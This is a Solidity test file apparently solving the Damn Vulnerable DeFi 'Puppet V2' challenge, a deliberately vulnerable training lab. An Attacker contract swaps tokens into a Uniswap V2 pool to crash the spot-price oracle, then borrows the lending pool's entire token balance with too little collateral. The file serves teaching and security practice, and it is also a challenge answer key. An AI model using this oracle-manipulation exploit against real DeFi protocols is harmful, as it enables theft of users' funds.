// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {
    IUniswapV2Pair
} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {
    IUniswapV2Factory
} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {
    IUniswapV2Router02
} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract Attacker {
    IUniswapV2Router02 public immutable uniswapV2Router;
    DamnValuableToken public immutable token;
    PuppetV2Pool public immutable Lendingpool;
    address public immutable recovery;
    WETH public immutable weth;

    receive() external payable {}

    constructor(
        IUniswapV2Router02 _uniswapV2Router,
        DamnValuableToken _token,
        PuppetV2Pool _lendingPool,
        address _recovery,
        WETH _weth
    ) {
        uniswapV2Router = _uniswapV2Router;
        token = _token;
        Lendingpool = _lendingPool;
        recovery = _recovery;
        weth = _weth;
    }

    function attack() external payable {
        //approving before manipulating price for no revert during attack due to insufficient allowance
        token.approve(address(uniswapV2Router), type(uint256).max);

        //now starting by manipulating price of dvt in uniswap pool for decrease dvt price and decrease collateral by the way
        //let's go
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        //swap syntax according to uniV2 router interface

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            token.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp * 2
        );
        //now the collateral needed for borrowing all dvt token is decreased enough
        //using the calculateDepositOfWETHRequired function to calculate who much weth needed for drain pool balance

        uint256 dvtToBorrow = token.balanceOf(address(Lendingpool));
        uint256 wethRequired = Lendingpool.calculateDepositOfWETHRequired(
            dvtToBorrow
        );
        //wrapping eth to weth for collateral
        weth.deposit{value: wethRequired}();
        weth.approve(address(Lendingpool), wethRequired);

        //lending all pool balance bypassing collateral required
        Lendingpool.borrow(dvtToBorrow);
        //last transfering all borrowed token to recovery account
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/builds/uniswap/UniswapV2Factory.json"
                ),
                abi.encode(address(0))
            )
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/builds/uniswap/UniswapV2Router02.json"
                ),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(token), address(weth))
        );

        // Deploy the lending pool
        lendingPool = new PuppetV2Pool(
            address(weth),
            address(token),
            address(uniswapV2Exchange),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(
            token.balanceOf(address(lendingPool)),
            POOL_INITIAL_TOKEN_BALANCE
        );
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(1 ether),
            0.3 ether
        );
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            ),
            300000 ether
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(
            uniswapV2Router,
            token,
            lendingPool,
            recovery,
            weth
        );
        //for test just transfering the initial token balance of player to attackre contract
        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
        attacker.attack{value: PLAYER_INITIAL_ETH_BALANCE}();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(
            token.balanceOf(address(lendingPool)),
            0,
            "Lending pool still has tokens"
        );
        assertEq(
            token.balanceOf(recovery),
            POOL_INITIAL_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
